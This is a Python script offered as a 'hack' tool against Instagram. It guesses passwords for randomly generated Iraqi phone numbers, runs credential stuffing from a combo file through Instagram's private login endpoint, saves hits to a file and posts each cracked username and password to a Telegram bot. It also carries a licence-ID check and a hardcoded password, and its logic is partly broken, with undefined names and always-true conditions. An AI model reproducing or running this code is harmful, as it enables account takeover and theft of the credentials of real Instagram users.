try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    import requests
except ImportError:
    os.system('pip install clear')
    import requests
    clear()
import os
import sys
import requests
import requests,sys,os,time

def xoshnaw():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1mID : "+id)
  try:
    httpCaht = requests.get("https://github.com/bekas1922/bekas1922/blob/main/list.txt").text
    if id in httpCaht:
      print("\033[92mYOUR ID IS ACTIVE!.....")
      msg = str(os.geteuid())
      time.sleep(0.3)
      pass
    else:
      print("\x1b[91mIDT ACTIVE NIA LA TELEGRAM NAMA BNERA....")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	xoshnaw()
xoshnaw()
Sayeb = 'bekasUP'
pss=input("\033[1;37m [~]\033[1;35mENTER PASSWORD :\033[1;33m")
if pss ==Sayeb:
 pass
 print("\033[1;32m    PASSWORD✅ ")
 os.system('clear')
else:
 exit('\033[1;31m            Forget PASSWORD')


try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    
B ='\033[1;96m'
print("""
===================================<-.(`-')  (`-')  _<-.(`-') (`-')  _  (`-').-> 
 __( OO)  ( OO).-/ __( OO) (OO ).-/  ( OO)_   
'-'---.\ (,------.'-'. ,--./ ,---.  (_)--\_)  
| .-. (/  |  .---'|  .'   /| \ /`.\ /    _ /  
| '-' `.)(|  '--. |      /)'-'|_.' |\_..`--.  
| /`'.  | |  .--' |  .   '(|  .-.  |.-._)   \ 
| '--'  / |  `---.|  |\   \|  | |  |\       / 
`------'  `------'`--' '--'`--' `--' `-----'  

 By👉@Y_U_56
WELOCOME To TOOL SHudeCHannel
 CHannel👉@SHudeCHannel

 CHRUP👉@SHudeGRUP

 
                           """)
bot = ''  
print('===================================')
def close():
    input('- Press Enter To Exit /')
    sys.exit()
print("\n ")
h , b,s,block = 0,0,0,0
tele = input("[+] Send dGood  telegram  𝚈/𝙽 ?: ")

if "Y" in tele:
	
    id = input("[+] 𝖤𝖭𝖳𝖤𝖱 𝖨𝖣 : ")
    bot = input("[+] 𝖤𝖭𝖳𝖤𝖱 𝖳𝖤𝖪𝖤𝖭 𝖡𝖮𝖳: ")
elif "y" in tele:
      id = input("[+] 𝖤𝖭𝖳𝖤𝖱 𝖨𝖣: ")
      bot = input("[+] 𝖤𝖭𝖳𝖤𝖱 𝖳𝖮𝖪𝖤𝖭 𝖡𝖮𝖳: ")
print("====================================")

ask = input("""
'\033[1;92m 
•••••••••••••••••••••••••••••••••••
[1] Hack Iraq zhmara 750

[1] Hack ba Combo
•••••••••••••••••••••••••••••••••••

====================================
[+] Halbzhera DL DL: """)

#-------------------------------------------------------

	
if ask == "1":               
    make = '0123456789'
    print("")
    print(f"\r                  [=] OK : {h} / NO : {b} / CP : {s} / Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+964750' + us
        pasw = '0750' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=\n\n  {user} \n[=] 𝙿𝙰𝚂𝚂  : {pasw}\n\n")
            open("Hits.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\033[1;91m                  [=] OK : {h} / NO : {b} / CP : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] OK : {h} / NO : {b} / CP : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] OK : {h} / NO : {b} / CP : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] OK : {h} / NO : {b} / CP : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] OK : {h} / NO : {b} / CP : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]OK : {h} / NO : {b} / CP : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] OK : {h} / CP : {b} / CP : {s} / Block : {block}",end='')
            
   
    make = '0123456789'
    print("")
    print(f"\r                  [=] OK : {h} / NO : {b} / CP : {s} / Block : {block}",end='')

elif ask =="2":
    assk = input("[+] Enter File Name : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    clear()
    banner()
   
    print("")
    print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        sleep(0.5)
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜᴇʟʟᴏ Bekas ɴᴇᴡ ᴀᴄᴄᴏᴜɴᴛ ʜᴀᴄᴋᴇᴅ ✅\n✹✹✹✹✹✹✹✹✹✹✹✹✹\n\n[=] 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {user} \n\[=] 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 : {pasw}\n\n✹✹✹✹✹✹✹✹✹✹✹✹✹\nBy @bekashacker")
         
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    

